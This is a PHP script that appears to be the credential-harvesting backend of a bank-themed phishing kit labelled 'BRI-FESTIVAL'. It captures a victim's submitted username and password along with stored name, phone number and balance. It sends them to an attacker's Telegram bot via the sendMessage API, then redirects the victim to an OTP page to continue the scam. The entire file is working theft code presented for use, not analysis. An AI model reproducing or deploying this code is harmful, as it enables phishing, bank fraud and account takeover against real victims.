<?php
include "telegram.php";
session_start();

$uname = $_POST['uname'];
$pass = $_POST['pass'];

$_SESSION['uname'] = $uname;
$_SESSION['pass'] = $pass;

$nama = $_SESSION['nama'];
$nohp = $_SESSION['nohp'];
$saldo = $_SESSION['saldo'];

$message = "
━─━────༺𝘽𝙍𝙄-𝙁𝙀𝙎𝙏𝙄𝙑𝘼𝙇༻────━─━
├───────────────────
├• 𝗡𝗮𝗺𝗮   :  ".$nama."
├• 𝗡𝗼𝗺𝗼𝗿 :  ".$nohp."
├• 𝗦𝗮𝗹𝗱𝗼  :  ".$saldo."
├───────────────────
├• 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 :  ".$uname."
├• 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 :  ".$pass."
╰───────────────────
━─━────༺𝘽𝙍𝙄-𝙁𝙀𝙎𝙏𝙄𝙑𝘼𝙇༻────━─━ ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../otp.php');
?>
